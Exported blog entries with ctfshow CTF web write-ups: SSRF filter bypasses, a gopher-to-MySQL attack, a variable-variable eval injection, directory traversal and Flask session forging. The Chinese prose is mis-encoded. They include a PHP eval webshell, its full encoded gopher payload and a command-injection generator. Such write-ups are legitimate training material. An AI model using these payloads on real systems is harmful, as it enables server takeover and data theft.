<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>gethostbyname å‡½æ•°ä»ä¸»æœºæ•°æ®åº“ä¸­æ£€ç´¢ä¸ä¸»æœºåå¯¹åº”çš„ä¸»æœºä¿¡æ¯ã€‚</p>
</blockquote>
<blockquote>
<p>filter_var() å‡½æ•°é€šè¿‡æŒ‡å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤å˜é‡ã€‚<br>å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›å·²è¿‡æ»¤çš„æ•°æ®ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p>
</blockquote>
<blockquote>
<p>FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰<br>FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</p>
</blockquote>
<p><strong>RFC1918æŒ‡å®šçš„ç§æœ‰åœ°å€æœ‰å“ªäº›?</strong></p>
<blockquote>
<p>Aç±»ï¼š10.0.0.0&#x2F;8å³10.0.0.0<del>10.255.255.255<br>Bç±»ï¼š172.16.0.0&#x2F;12å³172.16.0.0</del>172.31.255.255<br>Cç±»ï¼š192.168.0.0&#x2F;16å³192.168.0.0~192.168.255.255</p>
</blockquote>
<h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ­£åˆ™è¡¨è¾¾å¼è¡¨æ˜lä»¥ctf.å¼€å§‹ä»¥showç»“æŸï¼Œä¸­é—´ä»»æ„</p>
<pre><code>å½“parse_url()è§£æåˆ°é‚®ç®±æ—¶ï¼š@å‰é¢æ˜¯user
file_get_contents()ä¼šè®¿é—®host:port/pathï¼Œä¸useræ— å…³
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/95d0f8a3ff4c4339b93d58388abd9559.png" alt="1"></p>
<h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p><strong>æ‰“æ— å¯†ç çš„mysql</strong><br>ç‚¹å‡»ç™»é™†åè¿›å…¥check.phpæ–‡ä»¶ã€‚å•¥ä¹Ÿæ²¡æœ‰ï¼Œè¿”å›ä¸»é¡µæŸ¥çœ‹æºç ã€‚<br><img src="https://img-blog.csdnimg.cn/cb3f6d8d75444bd588df83cb2cc1fa85.png" alt="1">å‘ç°äº†è¿™ä¸ªï¼Œçœ‹æ¥ä¸€äº›wpï¼Œæ˜¯è¦ç”¨gopheråè®®æ‰“MYSQL,,è¿™é‡Œç”¨åˆ°è¿™ä¸ªå·¥å…·<a href="https://github.com/tarunkant/Gopherus">gopherus</a>ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/95522062ea2144718161ffab303b9848.png" alt="2"><br>æ„æ€å°±æ˜¯è¾“å…¥MySQLçš„ç”¨æˆ·åï¼Œå†ç»™å‡ºè¦è¿è¡Œçš„è¯­å¥ã€‚<br><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></p>
<blockquote>
<p>è¿™æ˜¯ä¸€ä¸ªMySQLæŸ¥è¯¢è¯­å¥ï¼Œå®ƒä¼šå°†ä¸€ä¸ªPHPä»£ç ç‰‡æ®µå†™å…¥åˆ°ç›®å½•â€&#x2F;var&#x2F;www&#x2F;html&#x2F;â€œä¸‹çš„æ–‡ä»¶â€2.phpâ€ä¸­ã€‚<br>æ‰€å†™å…¥çš„PHPä»£ç æ˜¯â€<?php @eval($_POST['cmd']);?>â€œã€‚è¿™æ®µä»£ç ä¼šåˆ›å»ºä¸€ä¸ªPHPè„šæœ¬ï¼Œè¯¥è„šæœ¬æ¥å—ä¸€ä¸ªåä¸ºâ€cmdâ€çš„POSTè¯·æ±‚å‚æ•°ï¼Œç„¶åå°†â€cmdâ€å‚æ•°çš„å†…å®¹ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚<br>è¿™æ®µä»£ç å¯èƒ½è¢«æ”»å‡»è€…ç”¨æ¥åœ¨WebæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªåé—¨ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„POSTè¯·æ±‚æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0b40b99caeea4464bd7f897232c326cf.png" alt="3"><br>**_**åé¢çš„urlå†è¿›è¡Œä¸€æ¬¡urlç¼–ç ã€‚<br>ç„¶åè¿›å…¥check.phpæ–‡ä»¶post<br><code>returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</code><br>è¿™æ—¶2.phpæ–‡ä»¶å·²ç»æˆåŠŸå†™å…¥ï¼Œè®¿é—®2.phpæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œå¾—åˆ°flagã€‚</p>
<h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p><strong>æ‰“redis</strong><br>redisçš„ç«¯å£æ˜¯<strong>6379</strong><br>æ‰“rediså³å¯</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow èœç‹—æ¯</title>
    <url>/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="æˆ‘çš„çœ¼é‡Œåªæœ‰"><a href="#æˆ‘çš„çœ¼é‡Œåªæœ‰" class="headerlink" title="æˆ‘çš„çœ¼é‡Œåªæœ‰$"></a>æˆ‘çš„çœ¼é‡Œåªæœ‰$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-11-10 17:20:38
# @Last Modified by:   h1xa
# @Last Modified time: 2022-11-11 08:21:54
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å‡å¦‚ä¼ å…¥_&#x3D;aï¼Œé‚£ä¹ˆå°±æ˜¯$<em>&#x3D;a;å†ä¼ å…¥a&#x3D;bï¼Œé‚£å°±æ˜¯$$</em>&#x3D;bï¼›</p>
<h3 id="extract-å®šä¹‰å’Œç”¨æ³•"><a href="#extract-å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="extract()å®šä¹‰å’Œç”¨æ³•"></a>extract()å®šä¹‰å’Œç”¨æ³•</h3><p>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p>
<p>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•° type ç”¨äºæŒ‡å®šå½“æŸä¸ªå˜é‡å·²ç»å­˜åœ¨ï¼Œè€Œæ•°ç»„ä¸­åˆæœ‰åŒåå…ƒç´ æ—¶ï¼Œextract() å‡½æ•°å¦‚ä½•å¯¹å¾…è¿™æ ·çš„å†²çªã€‚</p>
<p>è¯¥å‡½æ•°è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å¥—å¨ƒä¼ å…¥å˜é‡ï¼Œåº”è¯¥ä¼ å…¥36ä¸ªå˜é‡å†æ‰§è¡Œå‘½ä»¤ã€‚<br>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters
t<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>
code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#è¦æ‰§è¡Œçš„å‘½ä»¤</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>

t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code
<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(â€˜lsâ€™);</p>
</blockquote>
<p>å†å¯»æ‰¾flag<br>åŸæ¥åœ¨**cd ..&#x2F;..&#x2F;..&#x2F;**ä¸‹<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p>
<h2 id="æŠ½è€å©†"><a href="#æŠ½è€å©†" class="headerlink" title="æŠ½è€å©†"></a>æŠ½è€å©†</h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½</strong></p>
<p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br>è®¿é—®<strong><a href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong>æ—¶å‘ç°æŒ¨<strong>app.py</strong>å­˜åœ¨<a href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0">ç›®å½•ç©¿è¶Š</a>è®¿é—®<code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>å¾—åˆ°app.pyæ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8 -*-</span>

<span class="token triple-quoted-string string">"""
# File       : app.py
# Time       ï¼š2022/11/07 09:16
# Author     ï¼šg4_simon
# version    ï¼špython 3.9.7
# Descriptionï¼šæŠ½è€å©†ï¼Œå“‡å¶~
"""</span>

<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> random
<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag

<span class="token comment">#åˆå§‹åŒ–å…¨å±€å˜é‡</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>
    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span>



<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æ€ä¹ˆçŸ¥é“è¿™ä¸ªè·¯å¾„çš„ï¼Ÿä¸è¿‡è¿˜å¥½æˆ‘æœ‰èº«ä»½éªŒè¯"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çœ‹å¤§ä½¬çš„wpåŸæ¥æ˜¯flaskçš„sessionè®¤è¯é¢˜ç›®ï¼Œéœ€è¦åœ¨ç”Ÿæˆä¸€ä¸ªcookieæ‰èƒ½å¾—åˆ°flagã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æ€ä¹ˆçŸ¥é“è¿™ä¸ªè·¯å¾„çš„ï¼Ÿä¸è¿‡è¿˜å¥½æˆ‘æœ‰èº«ä»½éªŒè¯"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çœ‹åˆ°è¿™å¥æ‰¾åˆ°ä¸€ä¸ªè·¯å¾„</p>
<p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>è¿˜æœ‰èº«ä»½éªŒè¯ï¼Ÿçœ‹äº†ä»£ç å°±çŸ¥é“è¦sessionä¸­çš„isadminä¸ºçœŸã€‚é‡Œé¢ç­¾åè¦ç”¨åˆ°SECRET_KEYï¼›äºæ˜¯æˆ‘ä»¬å°†isadminçš„å€¼æ›´æ”¹åï¼Œä½¿ç”¨å¯†é’¥SECRET_KEYé‡æ–°åŠ å¯†ç”Ÿæˆä¸€ä¸ªsessionã€‚<br><a href="https://github.com/noraj/flask-session-cookie-manager">githubå¼€æºè„šæœ¬</a>ï¼Œåœ¨kaliä¸­æ‰§è¡Œè„šæœ¬<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>å¾—åˆ°æ–°çš„sessionï¼Œç„¶åè®¿é—®<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>ç”¨hackbaræ›´æ”¹cookieå¤´ï¼Œsessionæ”¹ä¸ºæ–°ç”Ÿæˆçš„ã€‚å¾—åˆ°flagã€‚</p>
<h2 id="ä¸€è¨€æ—¢å‡º"><a href="#ä¸€è¨€æ—¢å‡º" class="headerlink" title="ä¸€è¨€æ—¢å‡º"></a>ä¸€è¨€æ—¢å‡º</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//å°†flag.phpæ–‡ä»¶åŒ…å«åœ¨å½“å‰è„šæœ¬ä¸­</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
